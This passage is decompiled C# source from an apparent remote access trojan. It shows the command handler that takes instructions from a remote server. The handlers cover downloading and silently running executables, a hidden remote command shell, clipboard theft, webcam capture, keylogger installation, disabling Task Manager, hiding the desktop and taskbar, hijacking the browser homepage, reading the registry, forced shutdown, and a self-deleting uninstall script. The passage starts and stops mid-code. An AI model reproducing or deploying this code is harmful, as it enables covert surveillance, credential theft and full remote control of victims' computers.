              new Thread((ParameterizedThreadStart) (a0 => this.downd(Conversions.ToString(a0)))).Start((object) Strings.Mid(str1, 11, Strings.Len(str1)));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/IPREVIEW/", false) == 0)
          {
            try
            {
              new Thread((ParameterizedThreadStart) (a0 => this.prev(Conversions.ToString(a0)))).Start((object) Strings.Mid(str1, 11, Strings.Len(str1)));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/STARTSQN/", false) == 0)
          {
            try
            {
              this.deskflag = true;
              this.streamWriter.WriteLine("/STARTSQN/");
              this.streamWriter.Flush();
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/STARTSEQ/", false) == 0)
          {
            try
            {
              new Thread((ParameterizedThreadStart) (a0 => this.screens(Conversions.ToString(a0)))).Start((object) Strings.Mid(str1, 11, Strings.Len(str1)));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/STOPPSEQ/", false) == 0)
          {
            try
            {
              this.deskflag = false;
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/KILLPROC/", false) == 0)
          {
            try
            {
              new Thread((ParameterizedThreadStart) (a0 => this.killproc(Conversions.ToString(a0)))).Start((object) Strings.Mid(str1, 11, Strings.Len(str1)));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/SHOWMESG/", false) == 0)
          {
            this.iconmsg = MessageBoxIcon.None;
            this.btnmsg = MessageBoxButtons.OK;
            this.msgtxt = (string) null;
            this.titletxt = (string) null;
            try
            {
              List<string> stringList = new List<string>();
              string[] strArray = str1.Split('*');
              int index = 0;
              while (index < strArray.Length)
              {
                string str3 = strArray[index];
                stringList.Add(str3);
                checked { ++index; }
              }
              this.msgtxt = stringList[1].ToString();
              this.titletxt = stringList[2].ToString();
              string Left3 = stringList[4].ToString();
              if (Operators.CompareString(Left3, "Q", false) == 0)
                this.iconmsg = MessageBoxIcon.Question;
              else if (Operators.CompareString(Left3, "W", false) == 0)
                this.iconmsg = MessageBoxIcon.Exclamation;
              else if (Operators.CompareString(Left3, "I", false) == 0)
                this.iconmsg = MessageBoxIcon.Asterisk;
              else if (Operators.CompareString(Left3, "E", false) == 0)
                this.iconmsg = MessageBoxIcon.Hand;
              string Left4 = stringList[3].ToString();
              if (Operators.CompareString(Left4, "OK", false) == 0)
                this.btnmsg = MessageBoxButtons.OK;
              else if (Operators.CompareString(Left4, "ARI", false) == 0)
                this.btnmsg = MessageBoxButtons.AbortRetryIgnore;
              else if (Operators.CompareString(Left4, "YNC", false) == 0)
                this.btnmsg = MessageBoxButtons.YesNoCancel;
              else if (Operators.CompareString(Left4, "YN", false) == 0)
                this.btnmsg = MessageBoxButtons.YesNo;
              else if (Operators.CompareString(Left4, "OC", false) == 0)
                this.btnmsg = MessageBoxButtons.OKCancel;
              else if (Operators.CompareString(Left4, "RC", false) == 0)
                this.btnmsg = MessageBoxButtons.RetryCancel;
              this.t = new Thread(new ThreadStart(this.MSG));
              this.t.Start();
              this.Action(true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/PRINTTXT/", false) == 0)
          {
            try
            {
              string[] strArray = Strings.Mid(str1, 11, Strings.Len(str1)).Split('\u00BC');
              string Text = Conversions.ToString(NewLateBinding.LateGet(strArray.GetValue(1), (System.Type) null, "Replace", new object[2]
              {
                (object) "±",
                (object) "\r\n"
              }, (string[]) null, (System.Type[]) null, (bool[]) null));
              int emSize = int.Parse(Conversions.ToString(strArray.GetValue(0)));
              TextPrint textPrint = new TextPrint(Text);
              textPrint.Font = new Font("Tahoma", (float) emSize);
              textPrint.Print();
              str2 = (string) null;
              textPrint.Dispose();
              this.Action(true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/LISTDRVS/", false) == 0)
          {
            try
            {
              this.streamWriter.WriteLine("/LISTDRVS/" + this.ListDriver());
              this.streamWriter.Flush();
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/CLIPBOAR/", false) == 0)
          {
            try
            {
              this.clip = (string) null;
              Thread thread = new Thread((ThreadStart) (() => this.ReadClip()));
              thread.SetApartmentState(ApartmentState.STA);
              thread.Start();
              thread.Join();
              this.streamWriter.WriteLine("/CLIPBOAR/" + this.clip);
              this.streamWriter.Flush();
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/SETCLIPB/", false) == 0)
          {
            try
            {
              this.clip = Strings.Mid(str1, 11, Strings.Len(str1));
              this.clip = this.clip.Replace("***", "\r\n");
              Thread thread = new Thread(new ThreadStart(this.SetClip));
              thread.SetApartmentState(ApartmentState.STA);
              thread.Start();
              thread.Join();
              this.Action(true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/RENAMEFL/", false) == 0)
          {
            try
            {
              string Left5 = Strings.Mid(str1, 11, 1);
              string[] strArray = Strings.Mid(str1, 12, Strings.Len(str1)).Split('*');
              if (Operators.CompareString(Left5, "0", false) == 0)
                MyProject.Computer.FileSystem.RenameDirectory(Conversions.ToString(strArray.GetValue(0)), Conversions.ToString(strArray.GetValue(1)));
              else
                MyProject.Computer.FileSystem.RenameFile(Conversions.ToString(strArray.GetValue(0)), Conversions.ToString(strArray.GetValue(1)));
              this.Action(true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/REMOVESV/", false) == 0)
          {
            try
            {
              string tempPath = Path.GetTempPath();
              if (!tempPath.EndsWith("\\"))
                tempPath += "\\";
              string executablePath = Application.ExecutablePath;
              string str4 = "_uninsep.vbs";
              string path = tempPath + str4;
              string str5 = "On Error Resume Next\r\nDim WshShell, KV, Desc, oArgs\r\n";
              if (Conversions.ToDouble(this.os) < 6.0)
                str5 += "Set WshShell = WScript.CreateObject(\"WScript.Shell\")\r\nKV = \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ARC\"\r\nWshShell.RegDelete KV\r\n";
              string str6 = str5 + "Set fso = CreateObject(\"Scripting.FileSystemObject\")\r\nSet aFile = fso.GetFile(\"" + executablePath + "\")\r\naFile.Delete\r\nDo\r\nIf fso.FileExists(afile) Then\r\naFile.Delete\r\nElse\r\nExit Do\r\nEnd If\r\nIf Err.Number <> 0 Then\r\nerrorr = 1\r\nErr.Clear()\r\nWScript.sleep(1000)\r\nElse\r\nerrorr = 0\r\nExit Do\r\n End If\r\nloop until errorr = 1\r\nSet aFile = fso.GetFile(\"" + tempPath + str4 + "\")\r\naFile.Delete";
              StreamWriter streamWriter = new StreamWriter(path, false);
              streamWriter.Write(str6);
              streamWriter.Close();
              new Process()
              {
                StartInfo = {
                  WindowStyle = ProcessWindowStyle.Hidden,
                  FileName = path
                }
              }.Start();
              this.CloseWindows();
              Application.ExitThread();
              this.MyThread.Abort();
              Application.Exit();
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(true);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/LISTDIRS/", false) == 0)
          {
            try
            {
              new Thread((ParameterizedThreadStart) (a0 => this.listd(Conversions.ToString(a0)))).Start((object) Strings.Mid(str1, 11, Strings.Len(str1)));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.streamWriter.WriteLine("/ERRORDIR/");
              this.streamWriter.Flush();
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/DESKH/", false) == 0)
          {
            try
            {
              this.Hidedesk();
              this.Action(true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/DESKS/", false) == 0)
          {
            try
            {
              this.Showdesk();
              this.Action(true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/STARTH/", false) == 0)
          {
            try
            {
              this.hideSbtn();
              this.Action(true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/STARTS/", false) == 0)
          {
            try
            {
              this.showSbtn();
              this.Action(true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/HIDETASK/", false) == 0)
          {
            try
            {
              this.hideT();
              this.Action(true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/SHOWTASK/", false) == 0)
          {
            try
            {
              this.showT();
              this.Action(true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/FLIP/", false) == 0)
          {
            try
            {
              DisplaySettingsSample.DEVMODE devmode = DisplaySettingsSample.NativeMethods.CreateDevmode();
              this.GetSettings(ref devmode);
              devmode.dmDisplayOrientation = this.orientationValues[2];
              this.ChangeSettings(devmode);
              this.Action(true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/UNFLIP/", false) == 0)
          {
            try
            {
              DisplaySettingsSample.DEVMODE devmode = DisplaySettingsSample.NativeMethods.CreateDevmode();
              this.GetSettings(ref devmode);
              devmode.dmDisplayOrientation = this.orientationValues[0];
              this.ChangeSettings(devmode);
              this.Action(true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/SWAPM/", false) == 0)
          {
            try
            {
              MainFrm.SwapMouseButton(256L);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/UNSWAPM/", false) == 0)
          {
            try
            {
              MainFrm.SwapMouseButton(0L);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/CADD/", false) == 0)
          {
            try
            {
              this.EnableTaskManager(false);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/CADE/", false) == 0)
          {
            try
            {
              this.EnableTaskManager(true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/TMOFF/", false) == 0)
          {
            try
            {
              API.SendMessage((IntPtr) (int) ushort.MaxValue, 274U, (IntPtr) 61808, (IntPtr) 2);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/TMON/", false) == 0)
          {
            try
            {
              API.SendMessage((IntPtr) (int) ushort.MaxValue, 274U, (IntPtr) 61808, (IntPtr) -1);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/SCRSTART/", false) == 0)
          {
            try
            {
              this.StartScreenSaver(true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/SCRSTOP/", false) == 0)
          {
            try
            {
              this.StartScreenSaver(false);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/IEVER/", false) == 0)
          {
            try
            {
              this.streamWriter.WriteLine("/IEVERSIN/" + Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Internet Explorer").GetValue("Version").ToString());
              this.streamWriter.Flush();
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/STRTPAGE/", false) == 0)
          {
            try
            {
              this.streamWriter.WriteLine("/IESTARTP/" + Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Internet Explorer\\Main").GetValue("Start Page").ToString());
              this.streamWriter.Flush();
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/CHANGETL/", false) == 0)
          {
            string str7 = Strings.Mid(str1, 11, Strings.Len(str1));
            try
            {
              Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Internet Explorer\\Main").SetValue("Window Title", (object) str7, RegistryValueKind.String);
              this.Action(true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/CHANGEHP/", false) == 0)
          {
            string str8 = Strings.Mid(str1, 11, Strings.Len(str1));
            try
            {
              Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Internet Explorer\\Main").SetValue("Start Page", (object) str8);
              this.Action(true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/RUNSPAGE/", false) == 0)
          {
            try
            {
              string fileName = Strings.Mid(str1, 11, Strings.Len(str1));
              if (!fileName.StartsWith("http://") | !fileName.StartsWith("https://"))
                fileName = "http://" + fileName;
              Process.Start(fileName);
              this.Action(true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/LASTURLS/", false) == 0)
          {
            try
            {
              this.PopulateUrlList();
              this.streamWriter.WriteLine("/LASTURLS/" + this.PopulateUrlList());
              this.streamWriter.Flush();
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/DLARUNVS/", false) == 0)
          {
            try
            {
              List<string> stringList = new List<string>();
              string[] strArray = Strings.Mid(str1, 11, Strings.Len(str1)).Split('/');
              int index1 = 0;
              while (index1 < strArray.Length)
              {
                string str9 = strArray[index1];
                stringList.Add(str9);
                checked { ++index1; }
              }
              int index2 = checked (stringList.Count - 1);
              string address = Strings.Mid(str1, 11, Strings.Len(str1));
              string str10 = Environment.GetEnvironmentVariable("Temp") + "\\" + stringList[index2].ToString();
              MyProject.Computer.Network.DownloadFile(address, str10, (string) null, (string) null, false, 100000, true);
              this.Delay(1);
              Process.Start(str10);
              this.Action(true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/DLARUNHD/", false) == 0)
          {
            try
            {
              List<string> stringList = new List<string>();
              string[] strArray = Strings.Mid(str1, 11, Strings.Len(str1)).Split('/');
              int index3 = 0;
              while (index3 < strArray.Length)
              {
                string str11 = strArray[index3];
                stringList.Add(str11);
                checked { ++index3; }
              }
              int index4 = checked (stringList.Count - 1);
              string address = Strings.Mid(str1, 11, Strings.Len(str1));
              string destinationFileName = Environment.GetEnvironmentVariable("Temp") + "\\" + stringList[index4].ToString();
              MyProject.Computer.Network.DownloadFile(address, destinationFileName, (string) null, (string) null, false, 100000, true);
              this.Delay(1);
              new Process()
              {
                StartInfo = {
                  WindowStyle = ProcessWindowStyle.Hidden,
                  FileName = destinationFileName
                }
              }.Start();
              this.Action(true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/REFRWIND/", false) == 0)
          {
            try
            {
              new Thread(new ThreadStart(this.refreshwind)).Start();
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/CLSEWIND/", false) == 0)
          {
            try
            {
              Process.GetProcessById(Conversions.ToInteger(Strings.Mid(str1, 11, Strings.Len(str1)))).Kill();
              new Thread(new ThreadStart(this.refreshwind)).Start();
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/HIDEWIND/", false) == 0)
          {
            try
            {
              MainFrm.ShowWindow(Process.GetProcessById(Conversions.ToInteger(Strings.Mid(str1, 11, Strings.Len(str1)))).MainWindowHandle, 0);
              new Thread(new ThreadStart(this.refreshwind)).Start();
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/MINIWIND/", false) == 0)
          {
            try
            {
              MainFrm.ShowWindow(Process.GetProcessById(Conversions.ToInteger(Strings.Mid(str1, 11, Strings.Len(str1)))).MainWindowHandle, 6);
              this.Action(true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/MAXIWIND/", false) == 0)
          {
            try
            {
              MainFrm.ShowWindow(Process.GetProcessById(Conversions.ToInteger(Strings.Mid(str1, 11, Strings.Len(str1)))).MainWindowHandle, 3);
              this.Action(true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/RSTRWIND/", false) == 0)
          {
            try
            {
              MainFrm.ShowWindow(Process.GetProcessById(Conversions.ToInteger(Strings.Mid(str1, 11, Strings.Len(str1)))).MainWindowHandle, 9);
              this.Action(true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/DFLTWIND/", false) == 0)
          {
            try
            {
              MainFrm.ShowWindow(Process.GetProcessById(Conversions.ToInteger(Strings.Mid(str1, 11, Strings.Len(str1)))).MainWindowHandle, 10);
              this.Action(true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/SHOWWIND/", false) == 0)
          {
            try
            {
              MainFrm.ShowWindow(Process.GetProcessById(Conversions.ToInteger(Strings.Mid(str1, 11, Strings.Len(str1)))).MainWindowHandle, 4);
              this.Action(true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/RESTWIND/", false) == 0)
          {
            try
            {
              Interaction.Shell("shutdown -r -t 0");
              this.Action(true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/TURNWIND/", false) == 0)
          {
            try
            {
              Interaction.Shell("shutdown -s -t 0");
              this.Action(true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/LOGOWIND/", false) == 0)
          {
            try
            {
              Interaction.Shell("shutdown -l -t 0");
              this.Action(true);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              this.Action(false);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/STARTCMD/", false) == 0)
          {
            try
            {
              if (!this.FindAndKillProcess("cmd"))
              {
                this.processCmd = new Process();
                this.processCmd.StartInfo.FileName = "cmd.exe";
                this.processCmd.StartInfo.CreateNoWindow = true;
                this.processCmd.StartInfo.UseShellExecute = false;
                this.processCmd.StartInfo.RedirectStandardOutput = true;
                this.processCmd.StartInfo.RedirectStandardInput = true;
                this.processCmd.StartInfo.RedirectStandardError = true;
                this.processCmd.OutputDataReceived += new DataReceivedEventHandler(this.CmdOutputDataHandler);
                this.processCmd.Start();
                this.processCmd.BeginOutputReadLine();
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/STOPCMD/", false) == 0)
          {
            try
            {
              Process[] processes = Process.GetProcesses();
              int index = 0;
              while (index < processes.Length)
              {
                Process process = processes[index];
                if (process.ProcessName.StartsWith("cmd"))
                  process.Kill();
                checked { ++index; }
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/CMDCMDGO/", false) == 0)
          {
            try
            {
              this.strInput.Append(Strings.Mid(str1, 11, Strings.Len(str1)));
              this.strInput.Append("\r\n");
              this.processCmd.StandardInput.WriteLine((object) this.strInput);
              this.strInput.Remove(0, this.strInput.Length);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/STARTSQL/", false) == 0)
          {
            try
            {
              this.streamWriter.WriteLine("/STARTSQL/" + Conversions.ToString(Screen.PrimaryScreen.Bounds.Width) + "*" + Conversions.ToString(Screen.PrimaryScreen.Bounds.Height));
              this.streamWriter.Flush();
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          else if (Operators.CompareString(Left1, "/SETMOUSE/", false) == 0)
            new Thread((ParameterizedThreadStart) (a0 => this.setm(Conversions.ToString(a0)))).Start((object) Strings.Mid(str1, 11, Strings.Len(str1)));
          else if (Operators.CompareString(Left1, "/SETCLICK/", false) == 0)
            new Thread((ParameterizedThreadStart) (a0 => this.setcl(Conversions.ToString(a0)))).Start((object) Strings.Mid(str1, 11, Strings.Len(str1)));
          else if (Operators.CompareString(Left1, "/MEUPDATE/", false) != 0)
          {
            if (Operators.CompareString(Left1, "/REGYVIEW/", false) == 0)
            {
              try
              {
                string Left6 = Strings.Mid(str1, 11, Strings.Len(str1));
                if (Operators.CompareString(Left6, "CU", false) == 0)
                  new Thread((ParameterizedThreadStart) (a0 => this.ReadRegistry(Conversions.ToString(a0)))).Start((object) "CU");
                else if (Operators.CompareString(Left6, "LM", false) == 0)
                  new Thread((ParameterizedThreadStart) (a0 => this.ReadRegistry(Conversions.ToString(a0)))).Start((object) "LM");
                else if (Operators.CompareString(Left6, "US", false) == 0)
                  new Thread((ParameterizedThreadStart) (a0 => this.ReadRegistry(Conversions.ToString(a0)))).Start((object) "US");
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
            }
            else if (Operators.CompareString(Left1, "/REGVIEWS/", false) == 0)
            {
              try
              {
                string[] strArray = Strings.Mid(str1, 11, Strings.Len(str1)).Split('¥');
                string str12 = strArray[0];
                string str13 = strArray[1];
                string Left7 = str12;
                if (Operators.CompareString(Left7, "CU", false) == 0)
                  new Thread((ParameterizedThreadStart) (a0 => this.ReadRegistry1(Conversions.ToString(a0)))).Start((object) (str12 + str13));
                else if (Operators.CompareString(Left7, "LM", false) == 0)
                  new Thread((ParameterizedThreadStart) (a0 => this.ReadRegistry1(Conversions.ToString(a0)))).Start((object) (str12 + str13));
                else if (Operators.CompareString(Left7, "US", false) == 0)
                  new Thread((ParameterizedThreadStart) (a0 => this.ReadRegistry1(Conversions.ToString(a0)))).Start((object) (str12 + str13));
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
            }
            else if (Operators.CompareString(Left1, "/REGVIEWV/", false) == 0)
            {
              try
              {
                string[] strArray = Strings.Mid(str1, 11, Strings.Len(str1)).Split('¥');
                string str14 = strArray[0];
                string str15 = strArray[1];
                string Left8 = str14;
                if (Operators.CompareString(Left8, "CU", false) == 0)
                  new Thread((ParameterizedThreadStart) (a0 => this.ReadRegistry2(Conversions.ToString(a0)))).Start((object) (str14 + str15));
                else if (Operators.CompareString(Left8, "LM", false) == 0)
                  new Thread((ParameterizedThreadStart) (a0 => this.ReadRegistry2(Conversions.ToString(a0)))).Start((object) (str14 + str15));
                else if (Operators.CompareString(Left8, "US", false) == 0)
                  new Thread((ParameterizedThreadStart) (a0 => this.ReadRegistry2(Conversions.ToString(a0)))).Start((object) (str14 + str15));
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
            }
            else if (Operators.CompareString(Left1, "/SEARCHSS/", false) == 0)
            {
              try
              {
                string Left9 = Strings.Mid(str1, 11, Strings.Len(str1));
                if (Operators.CompareString(Left9, "1", false) == 0)
                  this.searchflag = true;
                else if (Operators.CompareString(Left9, "2", false) == 0)
                {
                  this.searchflag = false;
                  this.streamWriter.WriteLine("/SEARCHFL/SEARCHEND");
                  this.streamWriter.Flush();
                }
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
            }
            else if (Operators.CompareString(Left1, "/SEARCHFL/", false) == 0)
            {
              try
              {
                this.fileparts = Strings.Mid(str1, 11, Strings.Len(str1)).Split('¦');
                new Thread((ParameterizedThreadStart) (a0 => this.SearchDirectory(Conversions.ToString(a0)))).Start((object) this.fileparts[0]);
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
            }
            else if (Operators.CompareString(Left1, "/WEBLISTC/", false) == 0)
            {
              try
              {
                string lpszName = Strings.Space(100);
                string lpszVer = Strings.Space(100);
                int wDriver = 0;
                StringBuilder stringBuilder = new StringBuilder();
                bool driverDescriptionA;
                do
                {
                  driverDescriptionA = MainFrm.capGetDriverDescriptionA(checked ((short) wDriver), ref lpszName, 100, ref lpszVer, 100);
                  if (driverDescriptionA)
                    stringBuilder.Append(lpszName.Trim() + "¦");
                  checked { ++wDriver; }
                }
                while (driverDescriptionA);
                this.streamWriter.WriteLine("/WEBLISTC/" + stringBuilder.ToString());
                this.streamWriter.Flush();
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
            }
            else if (Operators.CompareString(Left1, "/WEBSTART/", false) == 0)
            {
              try
              {
                string parameter = Strings.Mid(str1, 11, Strings.Len(str1));
                this.webflag = "Connect";
                new Thread((ParameterizedThreadStart) (a0 => this.cap(Conversions.ToString(a0)))).Start((object) parameter);
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
            }
            else if (Operators.CompareString(Left1, "/WEBIMAGA/", false) == 0)
            {
              string Left10 = Strings.Mid(str1, 11, Strings.Len(str1));
              if (Operators.CompareString(Left10, "0", false) == 0)
                this.webflag5 = true;
              else if (Operators.CompareString(Left10, "1", false) == 0)
                this.webflag6 = true;
            }
            else if (Operators.CompareString(Left1, "/WEBIMAGE/", false) == 0)
            {
              try
              {
                string Left11 = Strings.Mid(str1, 11, Strings.Len(str1));
                if (Operators.CompareString(Left11, "Image", false) == 0)
                  this.webflag2 = "Image";
                else if (Operators.CompareString(Left11, "Capture", false) == 0)
                  this.webflag2 = "Capture";
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
            }
            else if (Operators.CompareString(Left1, "/WEBSTOPP/", false) == 0)
            {
              try
              {
                this.webflag5 = false;
                this.webflag6 = false;
                this.webflag2 = "";
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
            }
            else if (Operators.CompareString(Left1, "/WEBDISCO/", false) == 0)
            {
              try
              {
                this.webflag5 = false;
                this.webflag6 = false;
                this.webflag2 = (string) null;
                this.webflag3 = "Disconnect";
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
            }
            else if (Operators.CompareString(Left1, "/INSTALLK/", false) == 0)
            {
              try
              {
                new Thread((ParameterizedThreadStart) (a0 => this.installk(Conversions.ToString(a0)))).Start((object) Strings.Mid(str1, 11, Strings.Len(str1)));
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                this.Action(false);
                ProjectData.ClearProjectError();
              }
            }
            else if (Operators.CompareString(Left1, "/UPANDRUN/", false) == 0)
            {
              try
              {
